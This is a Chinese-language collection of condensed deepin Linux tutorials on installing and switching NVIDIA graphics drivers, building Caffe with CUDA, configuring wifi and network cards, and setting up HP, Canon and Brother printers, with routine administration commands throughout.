安装NVIDIA独立显卡第一步需停用相关服务：编辑/etc/modprobe.d/blacklist.conf，添加blacklist vga16fb、nouveau、rivafb、nvidiafb、rivatv，然后执行sudo update-initramfs -u。

第二步需从NVIDIA官网下载对应Linux驱动包，保存后在所在文件夹打开终端，执行sudo chmod +x ./*.run赋予权限，再用sudo apt-get remove --purge nvidia*卸载遗留驱动。

第三步需暂时关闭X服务：执行sudo service lightdm stop，按Ctrl + Alt + F2进入tty，输入账户名、密码，su后进入Downloads，执行sudo sh ./*.run，一路yes后reboot。

第四步配置显卡：用lspci | egrep 'VGA|3D'获取BusID，修改/etc/X11/xorg.conf，有方案A（双显卡，集显默认）、B（独显，屏蔽集显）、C（集显，屏蔽独显）三种方案。

第四步还需修改/etc/lightdm/display_setup.sh，写入#!/bin/sh、xrandr --setprovideroutputsource modesetting NVIDIA-0、xrandr --auto，赋予执行权限，再修改lightdm.conf，将#display-setup-script=改为display-setup-script=/etc/lightdm/display_setup.sh。

第五步检测：解决屏幕撕裂需编辑/etc/modprobe.d/nvidia-graphics-drivers.conf，添加options nvidia_drm modeset=1，执行sudo update-initramfs -u后reboot；用nvidia-smi查看显卡信息。

标题：thinkbook_14双显卡切换
本文只针对thinkbook 14双显卡机型，其它机器使用该方法存在风险。

解压files.zip工具包后，初始化需运行脚本：sudo sh Initialize.sh。

切换为独显的命令是运行脚本：sudo sh NVIDIA.sh。

出现黑屏、切换不成功或切回A卡驱动时，可运行脚本sudo sh Rescue.sh还原。

切换显卡后，用glxinfo | grep -i opengl命令查看当前显卡，通过OpenGL vendor string字段判定。

标题：笔记本双显卡安装过程(I卡_N卡)
安装笔记本双显卡（I卡、N卡）前，需删除以往所有安装的驱动和大黄蜂，命令为sudo apt remove --purge nvidia*和sudo apt remove --purge bumblebee*。

删除旧驱动等后，打开驱动管理器点击驱动安装，再安装相关软件，命令为sudo apt-get install bumblebee-nvidia bumblebee primus。

使用独显启动程序的命令有optirun command和optirun -b primus command，后者可提升性能。

可安装nvidia-smi，执行sudo nvidia-smi能查看驱动安装及设备运转情况；执行sudo lspci -v可查看详细信息。

使用optirun命令前，lspci查看独显信息为(rev ff)，代表设备关闭；使用后为(rev a2)，代表正常使用。

安装好驱动后，nvidia x server seetings打不开，会弹出错误提示；bumblebee配置下需用optirun或primusrun调用独显操作，如optirun -b none nvidia-settings -c :8。

黑屏或进不去系统时，可按ctrl+alt+2进入2号控制台，尝试sudo apt remove --purge nvidia*、sudo rm /etc/X11/xorg.conf、sudo apt install xorg这三种方法。

进不了tty时，开机选“Advanced options for *****”回车，选最后是“（recovery mode）”的行按“E”编辑，把ro改成rw，按F10进入root shell。

标题：解决N卡闭源驱动不能调亮度的问题
以deepin为例，修改相关文件可解决N卡闭源驱动不能调亮度问题，使用dedit编辑器，无则换其他编辑器。

安装了deepin-nvidia-prime，需修改/usr/share/X11/xorg.conf.d/11-nvidia-prime.conf，在Driver "nvidia"后加Option "RegistryDwords" "EnableBrightnessControl=1"。

存在/etc/X11/xorg.conf时，编辑它，在Driver "nvidia"后加Option "RegistryDwords" "EnableBrightnessControl=1"。

若上述文件都不存在，运行sudo nvidia-xconfig创建/etc/X11/xorg.conf，再按步骤修改。

完成操作后重启，即可调亮度，NVIDIA默认不开启是为避免兼容性问题，开启后可能有亮度到0导致黑屏的问题。

标题：如何安装显卡驱动
显卡是个人计算机基础组成部分之一，承担输出显示图形的任务，将计算机系统需要的显示信息转换驱动显示器，向显示器提供扫描信号，控制显示器正确显示，是连接显示器和主板的重要组件，其并行计算能力用于深度学习等运算。

独立显卡是将显示芯片、显存及相关电路单独做在一块电路板上，需主板扩展插槽，有独立显存，不占用系统内存，技术先进，性能较好，易升级，但功耗和发热量较大。

集成显卡将显示芯片、显存及相关电路集成在主板上，功耗低、发热量小，部分性能可媲美入门级独立显卡，但性能相对较低，固化在主板或CPU上，无法更换。

核芯显卡是Intel新一代图形处理核心，将图形核心与处理核心整合在同一块基板上，构成完整处理器，低功耗是其最主要优势，对整体能耗控制更优异。

主流显卡显示芯片由NVIDIA和AMD制造，采用NVIDIA的称为N卡，采用AMD的称为A卡。NVIDIA代表型号有GeForce RTX3090等，AMD有RX6800等，国产有景嘉微的JM5、JM7、JM9。

安装NVIDIA驱动需先禁用Nouveau驱动，步骤为：打开终端输入sudo vim /etc/modprobe.d/blacklist-nouveau.conf，添加blacklist nouveau options nouveau modeset=0，更新sudo update-initramfs -u，重启，用lspci | grep nouveau检查是否成功。

安装NVIDIA驱动前需安装gcc/cmake，通过sudo apt-get install build-essential和sudo apt-get install cmake安装，用gcc --version和cmake --version检查是否成功。

NVIDIA官网下载对应系统驱动，按住Ctrl+Alt+F1进入tty1终端，关闭显示管理sudo service lightdm stop，运行下载的驱动sudo ./NVIDIA-Linux-x86_64-440.82.run --no-opengl-files，重启后用nvidia-smi检查是否成功。

自研方式安装N卡驱动可通过sudo apt install nvidia-driver命令，用lsmod|grep nvidia查询是否成功；也可安装显卡驱动管理器，在应用商店搜索下载，支持GT730以上显卡，可进行驱动安装和切换等操作。

景嘉微显卡驱动安装简单，可在应用商店搜索下载安装景美JM72XXGPU驱动。

标题：如何在使用N卡闭源驱动时强制让GNOME-GDM使用Wayland
教程适用于使用GNOME桌面、GDM显示管理器、安装了Nvidia闭源驱动的环境，不适用于LightDM等其他显示管理器、非GNOME桌面、未安装Nvidia闭源驱动的情况。

已知问题：Nvidia闭源驱动不支持XWayland 3D加速，Wine未原生支持Wayland，导致Wine游戏助手无法启动3D游戏。

修改/etc/gdm/custom.conf，确保WaylandEnable=false被注释（前面有#）。

修改/usr/lib/udev/rules.d/61-gdm.rules，在Driver=="nvidia"……前面加#，若无效则在所有行前加#。

修改/etc/default/grub，在GRUB_CMDLINE_LINUX_DEFAULT的引号内末尾添加nvidia-drm.modeset=1，再运行更新grub的命令。

重启后，选择用户后点击右下角齿轮图标，若有“运行于 Xorg 的 GNOME”，则Wayland已启用，另两个为Wayland会话。

登陆后运行env | grep XDG，若XDG_SESSION_TYPE=wayland则为Wayland会话，x11则为Xorg会话。

想打游戏需注销并选择“运行于 Xorg 的 GNOME”，坚持用Wayland会话很多游戏无法启动，或使用wine-wayland。

标题：使用显卡对视频加速编解码
硬件视频加速使显卡可以对视频进行解码/编码，减轻CPU负担并节省电力。

使用显卡对视频加速编解码要求硬件性能较好且为双显卡设备，使用独显（切换为N卡）。

检测显卡视频加速可使用nvidia-settings，安装命令为sudo apt install nvidia-settings，启动后播放视频查看显存占用。

nvidia-smi是检测工具，安装用sudo apt install nvidia-smi，播放视频时输入命令查看显存占用。

sudo htop可在播放视频时查看CPU占用，启用硬件解码则CPU占用率较低，软件解码则较高可能达100%。

标题：双显卡笔记本安装N卡闭源驱动教程
安装N卡闭源驱动第一步是在星火商店安装双显卡快速切换插件，注销后可见图标，但可直接进行第二步。

星火商店网址为https://spark-app.store。

安装N卡闭源驱动第二步是使用代码sudo apt install nvidia-driver nvidia-settings一键安装440驱动、显卡设置，回车确认即可。

安装N卡闭源驱动第三步是在任务栏切换成nvidia显卡，自动注销后查看启动器中是否有“NVIDIA X 服务器设置”或在psensor中查看是否有独显温度信息。

更高阶玩法可尝试Nvidia Prime方案，参考网址https://bbs.deepin.org/zh/post/191741。

该教程内容由论坛用户bxkdhao提供，时间为2021年2月6日，原帖地址https://bbs.deepin.org/zh/post/226463。

教程作者使用的电脑硬件为神舟战神G7M-CT7NA 英特尔酷睿i7-9750H。

标题：双显卡手动切换方案
大黄蜂方案中，安装开源驱动的命令：sudo apt-get install bumblebee primus nvidia-settings，primus为可选项提升性能，nvidia-settings用于图形化设置。

大黄蜂方案中，安装闭源nvidia驱动的命令：sudo apt-get install bumblebee-nvidia nvidia-driver nvidia-settings。

验证大黄蜂驱动安装成功的方法：安装mesa-utils后，执行optirun glxinfo|grep NVIDIA。

bumblebeed版本为3.2.1时，电脑自带电源管理功能，开箱即用，无需额外设置。

Prime方案的前提：①专有NVIDIA驱动版本≥435.17；②Xorg-server版本≥1.20.6-1（查看版本命令：sudo X -version）。

禁用开源nouveau驱动步骤：1. sudo vim /etc/modprobe.d/blacklist-bcm43.conf，末尾加blacklist nouveau和options nouveau modeset=0；2. sudo update-initramfs -u；3. sudo init 6；4. 重启后lsmod | grep -i nouveau无输出则成功。

Prime方案安装NVIDIA驱动步骤：1. Ctrl+Alt+F2进入tty2，登录后sudo systemctl stop lightdm；2. 卸载旧驱动sudo apt-get remove --purge nvidia*；3. 赋予驱动文件可执行权限chmod u+x 驱动文件；4. sudo ./驱动文件安装；5. 配置display_setup.sh脚本及lightdm.conf，重启。

检查NVIDIA驱动安装成功的命令：nvidia-smi，成功会有内容显示。

nvidia-prime切换显卡命令：选择Intel显卡sudo prime-select intel；选择NVIDIA显卡sudo prime-select nvidia；查看当前方案prime-select query。

查看显卡BusID的命令：lspci | egrep -i 'VGA|3D'，输出包含集显和独显的BusID。

手动切换方案启用双显卡（集显默认）的xorg.conf配置：含ServerLayout（Screen 0为intel，Screen 1为nvidia）、两个Device（intel和nvidia，填对应BusID）及两个Screen部分。

手动切换方案启用集显屏蔽独显的xorg.conf配置：Section "Module" Load "modesetting"；Section "Device" Identifier "Card0" Driver "intel" BusID "PCI:集显BusID"。

标题：硬解码详解
"硬解码"是硬件解码的简称，指通过显卡的视频加速功能对高清视频进行解码，将CPU从视频解码运算中释放出来。

硬解码优点是效率高，功耗低、热功耗低，能流畅支持1080p甚至4K电影播放，不占用CPU，使CPU可承担更多其他任务。

硬解码起步较晚，软件支持度不如软解，对杂乱视频编码和封装格式兼容不全面，画面输出补偿及画质增强技术与软解差距大，软件设置复杂。

VDPAU是NVIDIA开发的基于UNIX和类UNIX系统的视频硬件解码技术，包括视频解码、后期处理等，支持最大2048像素的视频宽高，最小48像素。

VDPAU支持NVIDIA的GeForce 8系列以上的显卡进行视频硬件解码。

VDPAU支持MPEG-1、MPEG-2、MPEG-4 ASP、VC-1/WMV9和H.264视频解码的完全加速，但不支持MPEG-4 ASP的运动补偿和数据分块。

FFmpeg提供vdpau硬解码入口支持，不提供实现，具体实现由不同硬件厂商负责，不同显卡驱动对vdpau接口有不同实现。

VA-API规范最初由英特尔为其GMA系列GPU设计，目的是取代XvMC标准，成为Windows DxVA API的Unix多平台等效项。

VA-API支持的硬件和驱动包括：Linux的Intel Quick Sync开源驱动，AMD和Intel显卡的Mesa开源驱动等。

VA-API支持MPEG-2、VC-1/WMV3、MPEG-4第2部分、H.264、H.265、VP9等多种编解码器，具体支持取决于硬件和驱动功能。

英特尔图形开源驱动程序支持VA-API，如intel-media-driver支持Broadwell开始的HD Graphics系列及更高版本。

Nouveau开源驱动程序支持VA-API和VDPAU，libva-mesa-driver和mesa-vdpau支持GeForce 8系列和更新的GPU直至GTX 750。

NVIDIA专有驱动程序通过nvidia-utils支持GeForce 8系列和更新的GPU上的VDPAU。

ATI和AMDGPU开源驱动程序支持VA-API和VDPAU，libva-mesa-driver支持Radeon HD 2000及更高GPU的VA-API。

标题：Deepin1541安装Caffe
安装nvidia-bumblebee的命令：sudo apt update；sudo apt install bumblebee bumblebee-nvidia nvidia-smi。

安装nvidia-bumblebee后需重启，命令为sudo reboot。

重启后测试显卡状态的命令：nvidia-smi；optirun nvidia-smi。

使用nvidia显卡需在命令前加optirun，如optirun nvidia-settings -c :8。

cuda8及之前版本支持gcc-4.8、g++-4.8，安装命令：sudo apt install g++-4.8 gcc-4.8。

更改gcc和g++软连接步骤：cd /usr/bin；sudo rm gcc g++；sudo ln -s g++-4.8 g++；sudo ln -s gcc-4.8 gcc。

安装cuda开发工具命令：sudo apt install nvidia-cuda-dev nvidia-cuda-toolkit nvidia-nsight nvidia-visual-profiler。

使用nsight的方法：在终端输入optirun nsight。

安装pycuda的命令：sudo apt install python-pycuda。

运行pycuda测试代码的命令：optirun python cuda_test.py。

安装cudnn需复制头文件：cd cuda/include；sudo cp *.h /usr/include。

安装cudnn库文件：cd cuda/lib64；sudo cp libcudnn.so.7.0.1 /usr/lib；sudo cp libcudnn_static.a /usr/lib。

创建cudnn软连接：sudo ln -s /usr/libcudnn.so.7.0.1 /usr/libcudnn.so.7；sudo ln -s /usr/libcudnn.so.7 /usr/libcudnn.so。

安装OpenCV依赖库命令：sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev；sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev；sudo apt-get install libglu1-mesa-dev。

下载OpenCV源码命令：git clone https://github.com/opencv/opencv.git。

安装cmake-gui命令：sudo apt-get install cmake-gui。

OpenCV编译步骤：在build路径下执行make -j8；编译完成后sudo make install；sudo ldconfig。

安装caffe依赖库命令：sudo apt-get install libprotobuf-dev libleveldb-dev libsnappy-dev libhdf5-serial-dev protobuf-compiler；sudo apt-get install --no-install-recommends libboost-all-dev；sudo apt-get install libatlas-base-dev；sudo apt-get install libgflags-dev libgoogle-glog-dev liblmdb-dev。

删除不兼容库命令：sudo apt-get remove libleveldb-dev；sudo apt-get remove libprotobuf-dev；sudo apt-get remove libgflags-dev；sudo apt-get remove libgoogle-glog-dev。

编译安装leveldb步骤：git clone https://github.com/google/leveldb.git；cd leveldb/；make -j8；sudo cp -r leveldb/include/leveldb/ /usr/include/；sudo cp leveldb/out-shared/libleveldb.so.1.20 /usr/lib/；sudo ln -s /usr/lib/libleveldb.so.1.20 /usr/lib/libleveldb.so.1；sudo ln -s /usr/lib/libleveldb.so.1 /usr/lib/libleveldb.so；sudo ldconfig。

编译安装protobuf步骤：git clone https://github.com/google/protobuf.git；cd protobuf/；git checkout v2.5.0；git clone https://github.com/kgcd/gtest.git；./autogen.sh；./configure --prefix=/usr/；make -j8；make check -j8；sudo make install；sudo ldconfig。

下载caffe源码命令：git clone https://github.com/BVLC/caffe.git。

修改caffe的Makefile.config：cp Makefile.config.example Makefile.config；vim Makefile.config；开启USE_CUDNN := 1、OPENCV_VERSION := 3、WITH_PYTHON_LAYER := 1；设置CUDA_DIR := /usr；修改INCLUDE_DIRS和LIBRARY_DIRS路径。

修改caffe的Makefile：将LIBRARIES += ... hdf5_hl hdf5改为LIBRARIES += ... hdf5_serial_hl hdf5_serial。

编译caffe命令：make all -j8；make test -j8。

下载MNIST数据命令：data/mnist/get_mnist.sh。

转换MNIST数据格式命令：optirun examples/mnist/create_mnist.sh。

训练LeNet-5命令：optirun examples/mnist/train_lenet.sh。

测试MNIST预测命令：optirun build/tools/caffe.bin test -model examples/mnist/lenet_train_test.prototxt -weights examples/mnist/lenet_iter_10000.caffemodel -iterations 100。

标题：Deepin安装最新NVIDIA驱动
建议优先使用商店里的深度显卡驱动管理器安装NVIDIA驱动。安装黑屏后，只能recovery模式或单用户模式下卸载驱动。

安装独立显卡驱动可从官方仓库找编译好的驱动，第一步是执行sudo apt-get install bumblebee-nvidia nvidia-driver nvidia-settings。

nvidia-driver对应仓库里最新的nvidia驱动程序，仓库里有367、340、304三个版本，分别对应nvidia-driver、nvidia-legacy-340xx-driver、nvidia-legacy-304xx-driver。

linux下有三种optimus的实现：nouveau-only、nvidia-only、nouveau or nvidia（bumblebee）。ubuntu用第二种，debian只打包第三种bumblebee。

ubuntu的nvidia-prime切换显卡需重启X session，因X启动时nvidia驱动模块已加载，独显一直工作。debian用bumblebee，开机加载intel驱动，程序默认用集显，需用optirun运行程序启用独显。

检查驱动是否安装成功，先安装mesa-utils，命令为sudo apt-get install mesa-utils，再用optirun glxinfo|grep NVIDIA查看。

打开nvidia-settings提示“You do not appear to be using the NVIDIA X driver”，在terminal中运行optirun -b none nvidia-settings -c :8。

测试Bumblebee是否支持Optimus系统，可运行optirun glxgears -info，终端中看到Nvidia提示则工作正常。

使用bumblebee开启独立显卡玩游戏，可用Primusrun 程序名 或者 optirun 程序名，例如Primusrun firefox 或者optirun firefox。

标题：GPU
GPU是计算机的图形处理器，负责处理计算机的图像数据以及做一些大型计算工作。

目前主流的GPU架构有AMD的RDNA2架构，以及NVIDIA的安培架构。英特尔也在2022年下半年推出了自家的A系列独立显卡。从早期的Maxwell到最新的ADA架构，每一代GPU架构都进行了很多优化。

NVIDIA对Linux的驱动支持一直不好，2022年上半年，NVIDIA才将RTX30系列的GPU驱动开源。deepin可以在安装时选择自动安装N卡闭源驱动。

AMD显卡驱动对Linux支持很好，驱动程序构建在Linux内核里，部分独立显卡需要在AMD官网下载开源驱动进行安装。

英特尔也为Linux提供了良好的驱动支持，其显卡驱动支持可参考相关链接。英伟达也为大多数显卡提供了闭源驱动，可在其官网下载。

GPU计算是使用GPU作为协处理器来加速CPU，以加快程序的运行速度，GPU计算加速器于2007年由英伟达率先推出。

CPU由2到96个CPU内核组成，而GPU由成千上万较小的流处理器组成。它们共同运作以应对应用程序中的数据，这种大规模并行架构为GPU提供了高计算性能。

CUDA是显卡厂商NVIDIA推出的运算平台，是一种通用并行计算架构，该架构使GPU能够解决复杂的计算问题。它包含了CUDA指令集架构（ISA）以及GPU内部的并行计算引擎。

开发人员可以使用C语言来为CUDA架构编写程序，所编写出的程序可以在支持CUDA的处理器上以超高性能运行。开发者可以从相关链接下载Linux版本的CUDA程序。

标题：deepin系统下双显卡的切换
本文针对双显卡机器（I+N卡或A+N卡），deepin内核优选5.18.17-amd64-desktop-hwe版本。

安装N卡驱动方法：a.安装系统时，硬盘分区勾选“集成NVIDIA闭源驱动”；b.终端输入`sudo apt install nvidia-driver`。

判定NVIDIA闭源驱动安装成功：终端输入`dpkg -l | grep nvidia`查看显示。

官方切换至NVIDIA闭源方法：1.终端输入`sudo apt install deepin-prime`；2.用`sudo prime-select offload`设置混合模式；3.`sudo prime-select get-current`查看当前模式。

开启offload后N卡渲染方法1：安装mesa-utils，终端输入`__NV_PRIME_RENDER_OFFLOAD=1 __GLX_VENDOR_LIBRARY_NAME=nvidia 应用命令`。

开启offload后N卡渲染方法2：修改应用.desktop文件，如修改deepin-movie.desktop的Exec行为`sh -c "__NV_PRIME_RENDER_OFFLOAD=1 __GLX_VENDOR_LIBRARY_NAME=nvidia deepin-movie" %U`。

N卡渲染验证方法1：安装nvidia-smi，播放视频时用`nvidia-smi`查看显存在用情况。

N卡渲染验证方法2：安装nvidia-settings，播放视频时调用`nvidia-settings`查看显存在用情况。

硬件解码功能：offload模式暂不能调用，设置影院解码方式为“硬件解码”，用htop看CPU占用率判断。

还原设置：终端用`sudo prime-select unset`，切回I卡用`sudo prime-select intel`，切回A卡用`sudo prime-select amd`。

标题：光驱
光盘驱动器，电脑用来读写光盘内容的机器。

只读光盘驱动器包括CD-ROM、DVD-ROM。

Combo驱动器有读CD、DVD，写CD功能，有单激光头和双激光头类型。

可读写光盘驱动器包括CD-RW、DVD-RW、DVD+RW、DVD±RW(DVD-Dual)、DVD-RAM、DVD-Super Multi。

电子游戏机专用驱动器有PlayStation2、GAMECUBE、DreamCast、XBOX。

查询光驱信息可在终端执行cat /proc/ide/hdc/model。

标题：Dkms安装无线网卡驱动
DKMS全称是Dynamic Kernel Module Support，可维护内核维护内核外的驱动程序，在内核版本变动后自动重新生成新模块。

以RTL8812BU软件包为例，准备工作：1.解压压缩包，fixed-ok文件夹是arm架构的，RTL8812BU-master支持x86架构。

准备工作：2.找到对应文件夹，修改dkms.conf文件前两行，PACKAGE_NAME="rtl88x2bu"，PACKAGE_VERSION="5.6.1"，将文件名改为rtl88x2bu-5.6.1。

准备工作：3.把文件夹复制到/usr/src，命令为$sudo cp -r rtl88x2bu-5.6.1 /usr/src。4.安装dkms，命令为$sudo apt-get install dkms。

使用dkms：1.添加模块，执行“sudo dkms add rtl88x2bu/5.6.1”来添加rtl88x2bu-5.6.1。2.查看添加状态，命令为dkms status，显示rtl88x2bu, 5.6.1: added即模块处于added状态。

使用dkms：3.编译模块，执行sudo dkms build rtl8812xu/5.6.1，看到build completed即build成功，模块处于built状态。

使用dkms：4.安装模块，执行sudo dkms install rtl8812xu/5.6.1来安装88x2bu.ko，显示DKMS: install completed.即模块处于installed状态。

基于DKMS制作驱动程序的DEB安装包：2.安装所需工具，命令为sudo apt-get install dh-make libdigest-md5-file-perl。

基于DKMS制作驱动程序的DEB安装包：3.制作deb包，模块必须处于built状态，命令为sudo dkms mkdeb rtl88x2bu/5.6.1。

应用：如果电脑本来就装有相应网卡，或插入外部网卡，即可在“设备管理器“里的“网络适配器”中看到新加入的接口信息，实现无线上网。

标题：解决英特尔无线网卡问题
确认是否为英特尔无线网卡，可在设备管理器查看，或用命令lspci | grep -i wireless，输出带Intel字样则适用。

/etc/modprobe.d/iwlwifi.conf保存英特尔无线网卡参数，不同网卡需不同参数以达最佳状态。

iwlwifi.conf开头为options iwlwifi，后接参数，格式为名称=值，空格分隔，未给出参数为默认值。

11n_disable是WiFi4功能开关，0完全启用，1完全禁用（网速慢），2禁用发送链路聚合等，建议0或8。

bt_coex_active是蓝牙/WiFi共存开关，1允许同时开启，0不允许，默认1，建议1，若蓝牙影响WiFi可设0。

power_save是WiFi省电模式开关，1启用，0禁用，默认0，建议0。

swcrypto是加密方式开关，1软件加密，0硬件加密，默认0，建议0，若断网设1。

disable_11ac是WiFi5功能开关，0启用，1禁用，默认0，建议0，不支持5GHz无需关注。

disable_11ax是WiFi6功能开关，0启用，1禁用，默认0，建议0，不支持WiFi6无需关注。

UOS默认配置11n_disable=1（禁用WiFi4）、bt_coex_active=0（蓝牙WiFi不能共存）、swcrypto=1（软件加密），导致网速慢等问题。

更合理的iwlwifi.conf配置为options iwlwifi 11n_disable=0 bt_coex_active=1 power_save=0 swcrypto=0，启用WiFi4、允许共存、关闭省电、硬件加密。

修改iwlwifi.conf为合理设置的命令：sudo echo 'options iwlwifi 11n_disable=0 bt_coex_active=1 power_save=0 swcrypto=0' | sudo tee /etc/modprobe.d/iwlwifi.conf。

Debian、Ubuntu等系统更新initramfs使配置生效的命令：sudo update-initramfs -k all -u。

Fedora系统更新initramfs使配置生效的命令：sudo dracut --force --no-hostonly。

Archlinux系统更新initramfs使配置生效的命令：sudo mkinitcpio -P。

修改iwlwifi.conf后需执行更新initramfs命令并重启，否则可能不生效。

若重启后无线网卡连不上WiFi，可调整参数，如11n_disable=8，或bt_coex_active=0、swcrypto=1等。

标题：网卡
网卡、网络适配器或NIC是允许计算机在网络上通讯的硬件，有独一无二的48位MAC地址，属于OSI模型第1层，分板载和无线网卡，Linux对板载网卡支持良好，无线网卡可能有驱动问题。

Linux的以太型网卡界面通常称做eth0、eth1等，环形卡称做tr0、tr1等。ifconfig命令用于观看及修改网络界面状态，网络界面不在/dev目录下。

查看网卡信息的命令：dmesg | grep -i 'eth'、lspci | grep -i 'eth'、cat /etc/sysconfig/hwconf | grep -i eth。查看当前网卡物理地址：ifconfig eth0 | head -1 | awk '{print $5}'。

安装无线网卡驱动可尝试安装Windows驱动（如Mint无线网络驱动程序），或编译安装Linux驱动，如realtek的rtl8188eus网卡，下载驱动后执行sudo sh install.sh。

笔记本用Fn+Fx关闭无线网卡后无法启用，有Windows系统可重启到Windows开启再进Linux；无Windows可安装wicd，关闭后按Fn+Fx再启动，勾选“启用无线”。

禁止不需要的网卡启动：1. lspci -v查看pci硬件；2. 查找对应网卡驱动；3. sudo vim /etc/modprobe.d/blacklist.conf；4. 末尾输入blacklist +驱动；5. 保存重启。

设置主DNS：NetworkManager 0.9.8.x需手动编辑配置，如设置为8.8.8.8，执行echo "nameserver 8.8.8.8" | sudo tee -a /etc/resolvconf/resolv.conf.d/head，再sudo resolvconf -u，验证看/etc/resolv.conf。

反馈网络问题可提供路由器型号、配置，用deepin-bug-reporter收集信息：sudo apt-get install deepin-bug-reporter，sudo deepin-bug-reporter network，或提供计算机型号、内核信息等。

偶尔搜不到WiFi信号，可切换WiFi总开关或执行nmcli nm wifi false，nmcli nm wifi true，不行则sudo restart network-manager。

网络可连接但速度慢可能因MTU值过低，用ifconfig查看，一般为1500，可到控制中心->网络编辑页面手动设置。

Broadcom BCM4313无线网卡连接失败，可执行相关命令：卸载bcmwl-kernel-source，安装linux-firmware-nonfree，黑名单屏蔽b43和wl驱动，启用brcmsmac。

华硕X550VC用户的BCM4322网卡硬件开关默认关闭，临时解决方法是让系统待机。

华硕笔记本的Qualcomm Atheros AR9485网卡搜不到WiFi信号，可设置asus_nb_wmi驱动参数，或屏蔽acer-wmi。神舟K500C-I3笔记本连接需密码循环，执行echo "options ath9k nohwcrypt=1" | sudo tee -a /etc/modprobe.d/ath9k.conf重启。

联想ideapad系列无线网卡搜不到wifi信号，执行sudo su，echo "blacklist ideapad_laptop" | tee -a /etc/modprobe.d/black_ideapad_laptop.conf。

英特尔AX210无线网卡（5.10+内核）：下载驱动解压，sudo cp iwlwifi-ty-a0-gf-a0-59.ucode /lib/firmware，禁用原驱动缓存，重启。5.17+内核需删除或重命名三个相关文件。

标题：惠普打印扫描一体机如何开启扫描功能
深度系统中惠普打印扫描一体机可直接打印，但但扫描功能因驱动问题无法使用，办公室机型为HP ColorLaserJet MFP M278-M281 Postscript。

在终端运行hp-setup进行初始化，需选择打印机连接方式，点击next后会搜索指定网络环境中的打印机，选择后点next可能出现错误。

错误信息显示TypeError: translate() takes exactly one argument (2 given)，因深度系统hplip用python2，而python3中s.translate(identity, unprintable)应改为s.translate(unprintable)。

修改后重新执行hp-setup可正确连接打印机，打开扫描易点击扫描会弹出插件缺失窗口，在线下载安装即可，下载时间可能较长。

插件安装时会弹出证书不受信任窗口，选择继续安装，完成后点击扫描即可使用。

标题：Canon_打印机驱动程序安装
本文经验由深度论坛用户(springxcs)分享，原文地址为https://bbs.deepin.org/forum.php?mod=viewthread&tid=44975。

Deepin 15.3版本对部分Canon打印机尚不支持，可自行安装驱动。

安装驱动可参考链接：Installing a Printer Driver for Canon UFR II printers. https://wiki.debian.org/PrinterDriver/Canon/UFR-II，该链接对不同类型Canon打印机选择打印程序有详细说明。

UFR II/UFR II LT Printer Driver for Linux V3.20的下载地址为http://support-asia.canon-asia.com/contents/ASIA/EN/0100270810.html，包含V290版。

Deepin 15.3版本已具备Canon UFR II LT 120和130版。

标题：Deepin_154打印机离线安装方法图文教程
本经验由深度论坛用户(zpu198)分享，原文地址为https://bbs.deepin.org/forum.php?mod=viewthread&tid=138794&extra=

本文以hp p1008为例介绍打印机离线安装方法，参考帖子为https://bbs.deepin.org/post/138493

准备工作需手动下载plugin，下载地址为https://www.openprinting.org/download/printdriver/auxfiles/HP/plugins/，需下载两个文件放到易找到的地方，复制到其他机子可在别的机子上安装

设置root密码：打开“深度终端”，输入sudo passwd，然后输入自己用户密码（即登陆密码），重新设置（root、unix)密码，已设置可跳过

打开终端（DeepinTerminal），输入hp-plugin，终端输出中会显示版本号，如HP Linux Imaging and Printing System (ver. 3.16.10)

安装步骤：3.点yes；4.选择手动下载plugin 2个文件所在位置；5.选定hplip-3.16.10-plugin.run；6.点next；7.点yes；8.在i agree前打勾；9.点next；10.输入第一步设置的root密码；11.点ok；12.点OK完成安装

安装完成后添加打印机步骤：13.点添加；14.点forward；15.点apply后；16.点打印测试页

标题：Deepin上使用惠普打印机
在Deepin系统上使用打印机需简单配置，先在启动菜单找到打印设置，可搜索【打印】，打开后点击添加按钮。

第一次连接网络打印机，可查找网络打印机并输入ip地址，找到后选打印机，右侧用HPLIP连接，正常识别后点击应用添加。

添加打印机后可打印测试页，若失败，因Deepin默认安装hplip组件但缺少hp-plugin，需安装该插件。

安装hp-plugin可打开终端输入`hp-plugin`，终端会显示版本号，在线安装可能因网络问题失败，建议手动下载。

hp-plugin手动下载地址为https://www.openprinting.org/download/printdriver/auxfiles/HP/plugins/，需根据终端显示的版本下载对应文件，如3.16.10版本的hplip-3.16.10-plugin.run和hplip-3.16.10-plugin.run.asc。

用谷歌浏览器打开下载页面，找到正确文件后右键---链接另存为，选择保存位置即可下载hp-plugin。

hp-plugin离线安装可执行`hp-plugin`命令选本地文件，或用`hp-setup`命令选文件路径，需root密码，Deepin默认无root密码，需用`sudo passwd`设置。

标题：Virtualbox_虚拟机中网络安装在LINUX下共享的打印机方法
默认情况下DEEPIN已安装CUPS，未安装的可通过新立得或命令sudo apt-get install cups安装。

配置共享可通过网页打开https://主机IP:631/admin，勾选Share printers connected to this system和Allow printing from the Internet；或打开打印机设置，点击服务器——设置勾选相关选项，且打印机右键共享需勾选。

虚拟机网络需设为桥接网卡，在虚拟机中输入http://主机IP:631/printers，选择要连接的打印机获取网络地址。

添加打印机需在控制面板打开设备和打印机，点击添加打印机，选添加网络打印机，点击“我需要的打印机不在列表中”，按名称选择并输入网络地址，安装驱动。

标题：Printers
Printers是用于配置系统打印机服务器的工具，支持大多数打印机，可自动检测网络打印机。

安装Printers的命令是sudo apt-get install system-config-printer。

卸载Printers的命令是sudo apt-get remove system-config-printer。

Printers的仓库地址是http://packages.deepin.com/deepin/pool/main/s/system-config-printer/。

标题：打印机
深度操作系统和Debian、Ubuntu一样，使用CUPS（通用UNIX打印系统）。

添加打印机的方式分为：1）通过搜索添加（推荐），2）通过官方驱动添加。

搜索添加打印机可通过三种方式查找：自动查找，手动查找和URI查找。

添加网络打印机需确保拥有访问该网络打印机的权限。

国产打印机若下拉列表无型号，可选择'Generic'项。

惠普打印机驱动安装命令：sudo apt-get update && sudo apt-get install hplip hplip-gui hplip-plugin，之后输入hp-setup按提示操作。

三星打印机驱动安装命令：sudo apt-get install samsung-print。

兄弟打印机/扫描仪驱动下载地址：http://support.brother.com/g/b/productsearch.aspx?c=cn&lang=zh&content=dl。

兄弟打印机Driver Install Tool安装：解压.gz压缩包，在文件夹打开终端，执行chmod +x ./[文件名] && sudo ./[文件名]，按提示操作。

佳能打印机驱动包包括cndrvcups-ufr2-uk，cndrvcups-ufr2lt-uk，cndrvcups-capt，可全部安装。

